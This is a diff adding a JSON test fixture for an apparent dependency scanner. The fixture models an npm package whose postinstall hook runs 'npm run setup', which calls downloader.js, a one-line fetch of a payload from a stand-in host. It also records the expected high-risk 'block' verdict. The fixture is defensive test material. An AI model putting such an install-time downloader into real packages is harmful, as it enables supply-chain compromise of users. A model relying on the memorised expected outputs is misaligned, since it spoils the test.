@@ -1,0 +1,62 @@
+{
+  "id": "added-dependency-delegated-install-downloader",
+  "title": "A dependency delegates its install hook to a downloader script",
+  "category": "dependency-introduction",
+  "intent": "A postinstall hook can hide its executed file behind npm run. The delegated script and the file it invokes must remain provably install-reachable so the release is blocked instead of receiving an unproven medium warning.",
+  "previousPackageJson": { "name": "consumer", "version": "1.0.0" },
+  "stagedPackageJson": {
+    "name": "consumer",
+    "version": "1.1.0",
+    "dependencies": { "delegated-downloader": "1.0.0" }
+  },
+  "dependencyArtifacts": {
+    "delegated-downloader": {
+      "version": "1.0.0",
+      "packageJson": {
+        "name": "delegated-downloader",
+        "version": "1.0.0",
+        "scripts": {
+          "postinstall": "npm run setup",
+          "setup": "node downloader.js"
+        }
+      },
+      "files": [
+        {
+          "path": "package.json",
+          "size": 145,
+          "sha256": "delegated-package-json",
+          "flags": [],
+          "textSample": "{\"name\":\"delegated-downloader\",\"version\":\"1.0.0\",\"scripts\":{\"postinstall\":\"npm run setup\",\"setup\":\"node downloader.js\"}}"
+        },
+        {
+          "path": "downloader.js",
+          "size": 55,
+          "sha256": "delegated-downloader-js",
+          "flags": [],
+          "textSample": "fetch('https://cdn.example.invalid/payload');\n"
+        }
+      ]
+    }
+  },
+  "expectedDependencies": [
+    {
+      "name": "delegated-downloader",
+      "section": "dependencies",
+      "declaredSpec": "1.0.0",
+      "declarationKind": "exact",
+      "status": "inspected",
+      "resolvedVersion": "1.0.0",
+      "observation": { "execution": "observed", "risk": "observed" },
+      "automaticExecution": [{ "kind": "script", "name": "postinstall" }]
+    }
+  ],
+  "expectedFindings": [
+    {
+      "ruleId": "dependency.install-time-capability",
+      "severity": "high",
+      "file": "<dependency>delegated-downloader@1.0.0:package.json"
+    }
+  ],
+  "expectedRisk": "high",
+  "expectedRecommendation": "block manual approval"
+}
